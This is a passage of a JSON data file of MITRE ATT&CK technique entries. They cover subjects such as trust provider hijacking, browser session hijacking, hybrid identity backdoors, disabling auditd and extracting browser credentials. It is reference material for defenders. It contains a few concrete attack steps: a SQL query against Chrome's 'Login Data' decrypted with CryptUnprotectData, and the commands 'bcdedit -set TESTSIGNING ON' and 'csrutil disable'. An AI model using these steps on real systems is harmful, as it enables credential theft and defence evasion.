`Function` Registry values in `HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}` that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. ^[[3]](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1185":{"id":"T1185","name":"Browser Session Hijacking","description":"Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.^[[1]](https://en.wikipedia.org/wiki/Man-in-the-browser)^\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.^[[2]](https://www.cobaltstrike.com/help-browser-pivoting)^^[[3]](https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses)^ Executing browser-based behaviors such as pivoting may require specific process permissions, such as `SeDebugPrivilege` and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.^[[4]](https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf)^","platforms":["Windows"],"tactics":["Collection"],"campaigns":[],"groups":[]},"T1021":{"id":"T1021","name":"Remote Services","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).^[[1]](https://www.ssh.com/ssh)^^[[2]](https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx)^ They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.^[[3]](https://support.apple.com/en-us/HT209161)^^[[4]](https://support.apple.com/en-us/HT201710)^^[[5]](https://images.apple.com/remotedesktop/pdf/ARD_Admin_Guide_v3.3.pdf)^ Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.^[[6]](https://www.fireeye.com/blog/threat-research/2019/10/leveraging-apple-remote-desktop-for-good-and-evil.html)^^[[7]](http://lockboxx.blogspot.com/2019/07/macos-red-teaming-206-ard-apple-remote.html)^^[[4]](https://support.apple.com/en-us/HT201710)^","platforms":["Linux","macOS","Windows","IaaS"],"tactics":["Lateral Movement"],"campaigns":[],"groups":["Wizard Spider"]},"T1071.003":{"id":"T1071.003","name":"Mail Protocols","description":"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["Turla","SilverTerrier","APT32","APT28","Kimsuky"]},"T1556.007":{"id":"T1556.007","name":"Hybrid Identity","description":"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD^[[1]](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn)^:\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.^[[2]](https://blog.xpnsec.com/azuread-connect-for-redteam/)^^[[3]](https://o365blog.com/post/on-prem_admin/)^ In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.^[[4]](https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/)^\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.^[[5]](https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors)^","platforms":["Windows","Azure AD","SaaS","Google Workspace","Office 365","IaaS"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":["APT29"]},"T1595.002":{"id":"T1595.002","name":"Vulnerability Scanning","description":"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.^[[1]](https://owasp.org/www-project-automated-threats-to-web-applications/assets/oats/EN/OAT-014_Vulnerability_Scanning)^ Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Sandworm Team","Volatile Cedar","TeamTNT","APT28","Magic Hound","APT29","Aquatic Panda","Dragonfly","Earth Lusca"]},"T1059.009":{"id":"T1059.009","name":"Cloud API","description":"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell^[[1]](https://github.com/Azure/azure-powershell)^, or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ","platforms":["IaaS","Azure AD","Office 365","SaaS","Google Workspace"],"tactics":["Execution"],"campaigns":[],"groups":["TeamTNT","APT29"]},"T1596":{"id":"T1596","name":"Search Open Technical Databases","description":"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.^[[1]](https://www.whois.net/)^^[[2]](https://dnsdumpster.com/)^^[[3]](https://www.circl.lu/services/passive-dns/)^^[[4]](https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2)^^[[5]](https://www.sslshopper.com/ssl-checker.html)^^[[6]](https://www.digitalshadows.com/blog-and-research/content-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it/)^^[[7]](https://shodan.io)^\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1562.012":{"id":"T1562.012","name":"Disable or Modify Linux Audit System","description":"Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.\n\nOften referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`,  containing a sequence of `auditctl` commands loaded at boot time.^[[1]](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing)^^[[2]](https://izyknows.medium.com/linux-auditd-for-threat-detection-d06c8b941505)^\n\nWith root privileges, adversaries may be able to ensure their activity is not logged through disabling the Audit system service, editing the configuration/rule files, or by hooking the Audit system library functions. Using the command line, adversaries can disable the Audit system service through killing processes associated with `auditd` daemon or use `systemctl` to stop the Audit service. Adversaries can also hook Audit system functions to disable logging or modify the rules contained in the `/etc/audit/audit.rules` or `audit.conf` files to ignore malicious activity.^[[3]](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/honeypot-recon-new-variant-of-skidmap-targeting-redis/)^^[[4]](https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/)^","platforms":["Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1207":{"id":"T1207","name":"Rogue Domain Controller","description":"Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. ^[[1]](https://www.dcshadow.com/)^ Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. ^[[2]](https://adsecurity.org/?page_id=1821)^\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). ^[[1]](https://www.dcshadow.com/)^ The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. ^[[1]](https://www.dcshadow.com/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1553.006":{"id":"T1553.006","name":"Code Signing Policy Modification","description":"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.^[[1]](https://docs.microsoft.com/en-us/previous-versions/windows/hardware/design/dn653559(v=vs.85)?redirectedfrom=MSDN)^^[[2]](https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection)^ Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.^[[3]](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/installing-an-unsigned-driver-during-development-and-test)^^[[2]](https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection)^\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, [Modify Registry](https://attack.mitre.org/techniques/T1112), rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.^[[4]](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option)^^[[2]](https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection)^^[[5]](https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-2.html)^^[[6]](https://github.com/hfiref0x/TDL)^ Examples of commands that can modify the code signing policy of a system include `bcdedit.exe -set TESTSIGNING ON` on Windows and `csrutil disable` on macOS.^[[4]](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/the-testsigning-boot-configuration-option)^^[[2]](https://developer.apple.com/documentation/security/disabling_and_enabling_system_integrity_protection)^ Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.^[[7]](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163408/BlackEnergy_Quedagh.pdf)^\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying `g_CiOptions` to disable Driver Signature Enforcement, adversaries may conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) using a signed, but vulnerable driver.^[[8]](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)^^[[6]](https://github.com/hfiref0x/TDL)^","platforms":["Windows","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT39","Turla"]},"T1610":{"id":"T1610","name":"Deploy Container","description":"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.\n\nContainers can be deployed by various means, such as via Docker's `create` and `start` APIs or via a web application such as the Kubernetes dashboard or Kubeflow.^[[1]](https://docs.docker.com/engine/api/v1.41/#tag/Container)^^[[2]](https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/)^^[[3]](https://www.kubeflow.org/docs/components/pipelines/overview/pipelines-overview/)^ Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.^[[4]](https://blog.aquasec.com/malicious-container-image-docker-container-host)^","platforms":["Containers"],"tactics":["Defense Evasion","Execution"],"campaigns":[],"groups":["TeamTNT"]},"T1112":{"id":"T1112","name":"Modify Registry","description":"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. ^[[1]](https://technet.microsoft.com/en-us/library/cc732643.aspx)^ Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. ^[[2]](https://docs.microsoft.com/sysinternals/downloads/reghide)^ Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. ^[[3]](https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/)^ ^[[4]](https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353)^\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. ^[[5]](https://technet.microsoft.com/en-us/library/cc754820.aspx)^ Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["2015 Ukraine Electric Power Attack","Night Dragon","Operation Honeybee","Operation Wocao"],"groups":["Turla","APT38","Patchwork","Ember Bear","Silence","TA505","APT19","Gamaredon Group","Wizard Spider","APT32","Earth Lusca","Blue Mockingbird","Dragonfly","Gorgon Group","LuminousMoth","Kimsuky","APT41","Magic Hound","Threat Group-3390","FIN8","Honeybee","Operation Wocao","Dragonfly 2.0","Lazarus Group"]},"T1543.004":{"id":"T1543.004","name":"Launch Daemon","description":"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in `/System/Library/LaunchDaemons/` and `/Library/LaunchDaemons/`. Required Launch Daemons parameters include a `Label` to identify the task, `Program` to provide a path to the executable, and `RunAtLoad` to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.^[[1]](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)^^[[2]](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf)^^[[3]](https://www.real-world-systems.com/docs/launchdPlist.1.html)^\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the `RunAtLoad` parameter set to `true` and the `Program` parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.^[[4]](https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf)^^[[5]](https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf)^\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as `usr/local/bin` to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.^[[6]](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)^^[[7]](https://www.sentinelone.com/blog/how-malware-persists-on-macos/)^","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1580":{"id":"T1580","name":"Cloud Infrastructure Discovery","description":"An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.\n\nCloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a `DescribeInstances` API within the Amazon EC2 API that can return information about one or more instances within an account, the `ListBuckets` API that returns a list of all buckets owned by the authenticated sender of the request, the `HeadBucket` API to determine a bucket’s existence along with access permissions of the request sender, or the `GetPublicAccessBlock` API to retrieve access block configuration for a bucket.^[[1]](https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html)^^[[2]](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstances.html)^^[[3]](https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetPublicAccessBlock.html)^^[[4]](https://docs.aws.amazon.com/AmazonS3/latest/API/API_HeadBucket.html)^ Similarly, GCP's Cloud SDK CLI provides the `gcloud compute instances list` command to list all Google Compute Engine instances in a project ^[[5]](https://cloud.google.com/sdk/gcloud/reference/compute/instances/list)^, and Azure's CLI command `az vm list` lists details of virtual machines.^[[6]](https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest)^ In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).^[[7]](https://blog.malwarebytes.com/researchers-corner/2019/09/hacking-with-aws-incorporating-leaky-buckets-osint-workflow/)^\n\nAn adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.^[[8]](https://expel.io/blog/finding-evil-in-aws/)^ The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.^[[9]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as `DescribeDBInstances` to determine size, owner, permissions, and network ACLs of database resources. ^[[10]](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBInstances.html)^ Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.","platforms":["IaaS"],"tactics":["Discovery"],"campaigns":[],"groups":[]},"T1555.003":{"id":"T1555.003","name":"Credentials from Web Browsers","description":"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.^[[1]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^ Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, `AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data` and executing a SQL query: `SELECT action_url, username_value, password_value FROM logins;`. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function `CryptUnprotectData`, which uses the victim’s cached logon credentials as the decryption key.^[[2]](https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata)^\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.^[[3]](https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign)^^[[4]](https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html)^ Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.^[[5]](https://github.com/putterpanda/mimikittenz)^\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).","platforms":["Linux","macOS","Windows"],"tactics":["Credential Access"],"campaigns":["SolarWinds Compromise"],"groups":["Patchwork","ZIRCONIUM","APT3","APT33","Stealth Falcon","Leafminer","APT37","Sandworm Team","MuddyWater","LAPSUS$","HEXANE","TA505","Molerats","Ajax Security Team","Inception","Kimsuky","OilRig","FIN6","Stolen Pencil","APT29","Magic Hound"]},"T1574.008":{"id":"T1574.008","name":"Path Interception by Search Order Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. ^[[1]](http://msdn.microsoft.com/en-us/library/ms682425)^ ^[[2]](https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120)^ ^[[3]](http://msdn.microsoft.com/en-us/library/ms687393)^ However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument `net user`. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then `cmd.exe /C net user` will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. ^[[4]](https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN)^\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1491":{"id":"T1491","name":"Defacement","description":"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \n","platforms":["Windows","IaaS","Linux","macOS"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1535":{"id":"T1535","name":"Unused/Unsupported Cloud Regions","description":"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.\n\nCloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.\n\nA variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.\n\nAn example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.^[[1]](https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc)^","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1557.003":{"id":"T1557.003","name":"DHCP Spoofing","description":"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.^[[1]](https://datatracker.ietf.org/doc/html/rfc2131)^ The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.^[[2]](https://isc.sans.edu/forums/diary/new+rogueDHCP+server+malware/6025/)^^[[3]](https://web.archive.org/web/20150923175837/http://www.symantec.com/security_response/writeup.jsp?docid=2009-032211-2952-99&tabid=2)^ Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a `INFORMATION-REQUEST (code 11)` message to the `All_DHCP_Relay_Agents_and_Servers` multicast address.^[[4]](https://datatracker.ietf.org/doc/html/rfc3315)^ Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool. ","platforms":["Linux","Windows","macOS"],"tactics":["Credential 